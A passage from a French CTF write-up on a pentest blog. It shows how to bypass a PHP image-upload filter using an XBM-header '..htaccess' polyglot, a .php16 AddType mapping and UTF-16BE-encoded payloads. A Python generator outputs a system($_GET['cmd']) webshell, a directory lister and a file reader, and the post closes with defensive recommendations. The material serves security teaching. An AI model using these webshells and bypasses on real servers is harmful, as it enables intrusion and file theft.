+<li>La première ligne indique que l&rsquo;on veut faire exécuter du PHP à l&rsquo;aide de l&rsquo;extension <code>.php16</code>.</li>
+<li>La deuxième ligne indique un encodage particulier.</li>
+<li>La troisième ligne indique si le fichier à un encodage particulier.</li>
+<li>La quatrième ligne indique d&rsquo;afficher les erreurs PHP (utile dans notre cas).</li>
+</ol>
+<p>Ce fichier de configuration pourrait permettre d&rsquo;obtenir une exécution de commande. Or, lors du dépôt, l&rsquo;application donne l&rsquo;erreur suivante :</p>
+<p><code>lol filename is empty</code></p>
+<p>En analysant le code, ce dernier divise la chaîne en deux avec <code>.</code> et vérifie s&rsquo;il y a bien deux parties. Il faut donc envoyer un nom de fichier comme <code>..htaccess</code> pour contourner ce filtre.</p>
+<p>Erreur suivante :</p>
+<p><code>not an image.</code></p>
+<p>En effet, nous ne déposons pas une image mais un fichier de configuration. Il va falloir trouver quelque chose pour contourner le code ci-dessous :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">exif_imagetype</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;not an image.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="créer-un-fichier-polyglotte">Créer un fichier polyglotte</h2>
+<p>Qu&rsquo;est-ce qu&rsquo;un fichier polyglotte ?</p>
+<blockquote>
+<p>Un fichier polyglotte est un fichier qui peut être interprété dans plusieurs langages différents. Il s&rsquo;agit généralement d&rsquo;un fichier binaire qui contient des données dans plusieurs formats, tels que des instructions de code, des données de configuration ou des données de texte.</p>
+</blockquote>
+<p>La première astuce consiste à trouver un moyen de contourner le vérificateur d&rsquo;images. La documentation PHP donne une indication sur la marche à suivre : <a href="http://php.net/manual/en/function.exif-imagetype.php" target="_blank" rel="noopener noreffer ">http://php.net/manual/en/function.exif-imagetype.php</a></p>
+<p>En bas de la page un format semble intéressant :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/bypass-file-upload/2023-10-05-16-42-43.png"
+        data-srcset="/images/bypass-file-upload/2023-10-05-16-42-43.png, /images/bypass-file-upload/2023-10-05-16-42-43.png 1.5x, /images/bypass-file-upload/2023-10-05-16-42-43.png 2x"
+        data-sizes="auto"
+        alt="/images/bypass-file-upload/2023-10-05-16-42-43.png"
+        title="/images/bypass-file-upload/2023-10-05-16-42-43.png" /></p>
+<p>Ok mais qu&rsquo;est-ce qu&rsquo;un fichier XBM ?</p>
+<blockquote>
+<p>X BitMap, abrégé XBM, est un format d&rsquo;image numérique monochrome originellement conçu pour le système X Window, notamment pour les images de pointeur et d&rsquo;icône.</p>
+</blockquote>
+<p>La page contient un exemple :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define test_width 16
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define test_height 7
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">static</span> <span class="kt">char</span> <span class="n">test_bits</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x60</span> <span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le format de <code>xbitmap</code> est assez clair. La taille de l&rsquo;image est noté sur les premières lignes du fichier à l&rsquo;aide d&rsquo;un <code>#</code>. Ce format très proche du format <code>.htaccess</code> permet de contourner la fonction <code>exif_imagetype($tmp_name)</code> du programme.</p>
+<p>Voici le contenu du nouveau fichier <code>..htaccess</code> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#define width 1337                          # Define the width wanted by the code</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#define height 1337                         # Define the height</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">AddType application/x-httpd-php .php16      <span class="c1"># Say all file with extension .php16 will execute php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">php_value zend.multibyte <span class="m">1</span>                  <span class="c1"># Active specific encoding </span>
+</span></span><span class="line"><span class="cl">php_value zend.detect_unicode <span class="m">1</span>             <span class="c1"># Detect if the file have unicode content</span>
+</span></span><span class="line"><span class="cl">php_value display_errors <span class="m">1</span>                  <span class="c1"># Display php errors</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le fichier est correctement traité et déposé sur le serveur !</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/bypass-file-upload/2023-10-05-16-51-19.png"
+        data-srcset="/images/bypass-file-upload/2023-10-05-16-51-19.png, /images/bypass-file-upload/2023-10-05-16-51-19.png 1.5x, /images/bypass-file-upload/2023-10-05-16-51-19.png 2x"
+        data-sizes="auto"
+        alt="/images/bypass-file-upload/2023-10-05-16-51-19.png"
+        title="/images/bypass-file-upload/2023-10-05-16-51-19.png" /></p>
+<h2 id="contourner-la-protection-anti-php">Contourner la protection anti-php</h2>
+<p>Un autre filtre empêche le dépôt de contenu PHP avec la vérification de la chaine de caractères <code>&lt;?</code>. Or, il est possible de contourner cette protection en encodant le payload.</p>
+<p>En effet, PHP supporte plusieurs format d&rsquo;encodage. Actuellement, l&rsquo;écriture de base est en utf-8, mais PHP supporte également l&rsquo;encodage utf-16.</p>
+<p>En utf-8, un caractère est encodé sur 1 octet.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mo">00000000</span><span class="o">:</span> <span class="mi">3</span><span class="nx">c3f</span> <span class="mi">7068</span> <span class="mi">7020</span> <span class="mi">7379</span> <span class="mi">7374</span> <span class="mi">656</span><span class="nx">d</span> <span class="mi">2824</span> <span class="mi">5</span><span class="nx">f47</span>  <span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_G</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000010</span><span class="o">:</span> <span class="mi">4554</span> <span class="mi">5</span><span class="nx">b27</span> <span class="mi">636</span><span class="nx">d</span> <span class="mi">6427</span> <span class="mi">5</span><span class="nx">d29</span> <span class="mi">3</span><span class="nx">b20</span> <span class="mi">6469</span> <span class="mi">6528</span>  <span class="nx">ET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="k">die</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000020</span><span class="o">:</span> <span class="mi">293</span><span class="nx">b</span> <span class="mi">203</span><span class="nx">f</span> <span class="mf">3e0</span><span class="nx">a</span>                           <span class="p">);</span> <span class="cp">?&gt;</span><span class="err">.
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Or, en utf-16 l&rsquo;encodage est effectué sur <strong>2 octets</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mo">00000000</span><span class="o">:</span> <span class="mo">003</span><span class="nx">c</span> <span class="mo">003</span><span class="nx">f</span> <span class="mo">0070</span> <span class="mo">006</span><span class="mi">8</span> <span class="mo">0070</span> <span class="mo">0020</span> <span class="mo">0073</span> <span class="mo">007</span><span class="mi">9</span>  <span class="o">.&lt;.?.</span><span class="nx">p</span><span class="o">.</span><span class="nx">h</span><span class="o">.</span><span class="nx">p</span><span class="o">.</span> <span class="o">.</span><span class="nx">s</span><span class="o">.</span><span class="nx">y</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000010</span><span class="o">:</span> <span class="mo">0073</span> <span class="mo">0074</span> <span class="mo">0065</span> <span class="mo">006</span><span class="nx">d</span> <span class="mo">002</span><span class="mi">8</span> <span class="mo">0024</span> <span class="mo">005</span><span class="nx">f</span> <span class="mo">0047</span>  <span class="o">.</span><span class="nx">s</span><span class="o">.</span><span class="nx">t</span><span class="o">.</span><span class="nx">e</span><span class="o">.</span><span class="nx">m</span><span class="o">.</span><span class="p">(</span><span class="o">.</span><span class="err">$</span><span class="o">.</span><span class="nx">_</span><span class="o">.</span><span class="nx">G</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000020</span><span class="o">:</span> <span class="mo">0045</span> <span class="mo">0054</span> <span class="mo">005</span><span class="nx">b</span> <span class="mo">0027</span> <span class="mo">0063</span> <span class="mo">006</span><span class="nx">d</span> <span class="mo">0064</span> <span class="mo">0027</span>  <span class="o">.</span><span class="nx">E</span><span class="o">.</span><span class="nx">T</span><span class="o">.</span><span class="p">[</span><span class="o">.</span><span class="s1">&#39;.c.m.d.&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000030</span><span class="o">:</span> <span class="mo">005</span><span class="nx">d</span> <span class="mo">002</span><span class="mi">9</span> <span class="mo">003</span><span class="nx">b</span> <span class="mo">0020</span> <span class="mo">0064</span> <span class="mo">006</span><span class="mi">9</span> <span class="mo">0065</span> <span class="mo">002</span><span class="mi">8</span>  <span class="o">.</span><span class="p">]</span><span class="o">.</span><span class="p">)</span><span class="o">.</span><span class="p">;</span><span class="o">.</span> <span class="o">.</span><span class="nx">d</span><span class="o">.</span><span class="nx">i</span><span class="o">.</span><span class="nx">e</span><span class="o">.</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000040</span><span class="o">:</span> <span class="mo">002</span><span class="mi">9</span> <span class="mo">003</span><span class="nx">b</span> <span class="mo">0020</span> <span class="mo">003</span><span class="nx">f</span> <span class="mo">003</span><span class="nx">e</span> <span class="mi">0</span><span class="nx">a</span>              <span class="o">.</span><span class="p">)</span><span class="o">.</span><span class="p">;</span><span class="o">.</span> <span class="o">.?.&gt;.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Il a été choisi ici un encodage <strong>utf-16 Big Endian</strong>. Le premier caractère <code>&lt;</code> s&rsquo;écrira donc <code>003c</code> en utf-16 au lieu de <code>3c</code> en utf-8. Avec cette astuce, le filtre est contourné.</p>
+<p>Voici un petit script python pour automatiser la création de payload.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Description : create and bypass file upload filter with .htaccess</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author : Thibaud Robin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span>
+</span></span><span class="line"><span class="cl"><span class="n">SIZE_HEADER</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">#define width 1337</span><span class="se">\n</span><span class="s2">#define height 1337</span><span class="se">\n\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_php_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">script</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">phpfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">phpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">script</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-16be&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">phpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">SIZE_HEADER</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">phpfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_htacess</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">htaccess</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;..htaccess&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">SIZE_HEADER</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AddType application/x-httpd-php .php16</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;php_value zend.multibyte 1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;php_value zend.detect_unicode 1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;php_value display_errors 1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">htaccess</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl"><span class="n">generate_htacess</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">generate_php_file</span><span class="p">(</span><span class="s2">&#34;webshell.php16&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); die(); ?&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">generate_php_file</span><span class="p">(</span><span class="s2">&#34;scandir.php16&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;?php echo implode(&#39;</span><span class="se">\n</span><span class="s2">&#39;, scandir($_GET[&#39;dir&#39;])); die(); ?&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">generate_php_file</span><span class="p">(</span><span class="s2">&#34;getfile.php16&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;?php echo file_get_contents($_GET[&#39;file&#39;]); die(); ?&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">generate_php_file</span><span class="p">(</span><span class="s2">&#34;info.php16&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;?php phpinfo(); die(); ?&gt;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Il n&rsquo;y a plus qu&rsquo;à déposer et apprécier sa webshell bien méritée. Ouf ! 😂</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/bypass-file-upload/2023-10-05-16-56-26.png"
+        data-srcset="/images/bypass-file-upload/2023-10-05-16-56-26.png, /images/bypass-file-upload/2023-10-05-16-56-26.png 1.5x, /images/bypass-file-upload/2023-10-05-16-56-26.png 2x"
+        data-sizes="auto"
+        alt="/images/bypass-file-upload/2023-10-05-16-56-26.png"
+        title="/images/bypass-file-upload/2023-10-05-16-56-26.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/bypass-file-upload/2023-10-05-16-56-29.png"
+        data-srcset="/images/bypass-file-upload/2023-10-05-16-56-29.png, /images/bypass-file-upload/2023-10-05-16-56-29.png 1.5x, /images/bypass-file-upload/2023-10-05-16-56-29.png 2x"
+        data-sizes="auto"
+        alt="/images/bypass-file-upload/2023-10-05-16-56-29.png"
+        title="/images/bypass-file-upload/2023-10-05-16-56-29.png" /></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Il est complexe de mettre en place une fonctionnalité de téléchargement de fichiers totalement sécurisée.</p>
+<p>Pour se protéger contre les contournements utilisés dans ce challenge, le développeur aurait pu implémenter les sécurités suivantes :</p>
+<ol>
+<li>Utiliser les fonctions d&rsquo;<code>ImageMagick</code> pour vérifier les fichiers avant de les déposer.</li>
+<li>Mieux vérifier l&rsquo;extension de fichier.</li>
+<li>Empêcher l&rsquo;interprétation des fichiers <code>.htaccess</code> dans le répertoire.</li>
+<li>Installer un WAF (Web Application Firewall) comme ModSecurity de Apache.</li>
+</ol>
+<p>A retenir ! Ne faites jamais confiance aux entrées utilisateurs !</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Mis à jour le 04/10/2023</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/comment-contourner-d%C3%A9p%C3%B4t-fichiers/index.md" target="_blank">Lire Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Partager sur Twitter" data-sharer="twitter" data-url="http://localhost:1313/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" data-title="Htaccess, ou comment contourner les mécanismes de dépôt de fichiers." data-via="trackflaw" data-hashtags="Pentest,Test d&#39;intrusion,CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Facebook" data-sharer="facebook" data-url="http://localhost:1313/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" data-hashtag="Pentest"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" data-title="Htaccess, ou comment contourner les mécanismes de dépôt de fichiers."><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Line" data-sharer="line" data-url="http://localhost:1313/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" data-title="Htaccess, ou comment contourner les mécanismes de dépôt de fichiers."><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur 微博" data-sharer="weibo" data-url="http://localhost:1313/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" data-title="Htaccess, ou comment contourner les mécanismes de dépôt de fichiers." data-image="/images/bypass-file-upload/htaccess.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pentest/">Pentest</a>,&nbsp;<a href=""></a>,&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/rappel-de-r%C3%A9union-vous-veut-du-mal/" class="prev" rel="prev" title="CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe."><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe.</a>
+            <a href="/cr%C3%A9er-son-r%C3%A9seau-botnet-cisco-cve-2023-20198/" class="next" rel="next" title="CVE-2023-20198 Cisco IOS-XE ZeroDay - Ou comment créer son réseau de botnet ?">CVE-2023-20198 Cisco IOS-XE ZeroDay - Ou comment créer son réseau de botnet ?<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Trackflaw</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Remonter en haut">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="Afficher les commentaires">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.fr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copier dans le presse-papiers","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Ok !","link":"En savoir plus","message":"Trackflaw utilise des cookies pour améliorer votre expérience et effectuer des statistiques."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"fr","maxResultLength":10,"noResultsFound":"Aucun résultat trouvé","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TRE4WGVY4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-TRE4WGVY4F');
+</script></body>
+</html>
